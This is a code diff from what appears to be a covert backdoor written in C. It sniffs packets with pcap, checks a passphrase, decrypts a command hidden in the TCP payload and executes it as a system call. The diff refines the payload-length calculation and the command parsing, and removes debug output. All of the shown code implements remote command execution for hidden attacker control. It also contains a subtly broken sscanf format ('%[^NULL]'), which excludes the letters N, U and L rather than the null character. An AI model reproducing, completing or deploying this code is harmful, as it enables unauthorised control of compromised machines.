@@ -128,21 +128,19 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
         }
         
         // Passphrase must match, so grab the encrypted command from the payload
-#ifdef _IP_VHL
-        payloadSize = ntohs(iph->ihl) - (ipHeaderSize + tcpHeaderSize);
+#if defined __APPLE__ || defined __USE_BSD
+        payloadSize = ntohs(iph->ip_len) - (ipHeaderSize + tcpHeaderSize);
 #else
-        payloadSize = ntohs(iph->ip_hl) - (ipHeaderSize + tcpHeaderSize);
+        payloadSize = ntohs(iph->tot_len) - (ipHeaderSize + tcpHeaderSize);
 #endif
         payload = (char*)(packet + SIZE_ETHERNET + ipHeaderSize + tcpHeaderSize);
         
         // Get the command and execute it
         getCommand(&payload, payloadSize);
-        
     }
     
     // Perform cleanup for any allocated memory
     free(passphrase);
-    
 }
 
 int validPassphrase(char *passphrase)
@@ -188,12 +186,16 @@ void getCommand(char **command, int payloadSize)
     decryptedCommand = encrypt_data(*command, date, payloadSize);
 
     // Get the command value and an optional filename or command
-    if (sscanf(decryptedCommand, "%d|%s", &option, token) != 2)
+    if (sscanf(decryptedCommand, "%d|%[^NULL]", &option, token) != 2)
     {
         free(token);
         return;
     }
-    fprintf(stderr, "String is: %s\n", token);
+
+    // Give the client some time to set itself up
+    sleep(2);
+    
+    // Execute the given command
     switch (option) {
         case EXECUTE_SYSTEM_CALL:
             executeSystemCall(token);
@@ -207,6 +209,5 @@ void getCommand(char **command, int payloadSize)
         default:
             break;
     }
-    systemFatal("Done executing command");
     free(token);
 }
